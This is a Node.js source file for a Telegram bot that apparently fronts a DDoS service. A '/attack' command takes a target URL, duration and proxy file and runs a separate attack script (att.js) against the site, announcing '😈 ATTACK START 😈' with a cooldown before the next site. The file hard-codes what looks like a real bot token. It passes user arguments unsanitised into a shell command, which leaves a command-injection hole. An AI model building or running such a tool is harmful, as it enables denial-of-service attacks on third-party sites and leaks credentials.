const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Telegram bot token
const token = '6303718232:AAGvJkQD7WYwiDnRPHaZ2M8CiD4_DBHWkew';
const bot = new TelegramBot(token, { polling: true });

// Function to check if a string is a valid URL
function isValidURL(url) {
    try {
        new URL(url);
        return true;
    } catch (error) {
        return false;
    }
}

bot.onText(/\/attack (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');
    const target = args[0];
    const time = parseInt(args[1]);
    const numWords = args[2] || 64;
    const numChars = args[3] || 10;
    const proxyFile = args[4] || proxy.txt;

    // Validate arguments
    if (!isValidURL(target)) {
        bot.sendMessage(chatId, 'Please provide a valid URL');
        return;
    }
    if (isNaN(time) || time < 10 || time > 60) {
        bot.sendMessage(chatId, 'Time must be between 10 and 60');
        return;
    }

    // Run command and send success message
    const command = `node att.js ${target} ${time} ${numWords} ${numChars} ${proxyFile}`;
    exec(command, (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `Error occurred: ${error.message}`);
        } else {
            bot.sendMessage(chatId, '😈 ATTACK START 😈');
        }
    });

    // Start countdown timer
    bot.sendMessage(chatId, 'Countdown: 30 seconds');
    setTimeout(() => {
        bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
    }, 30000);
});
    
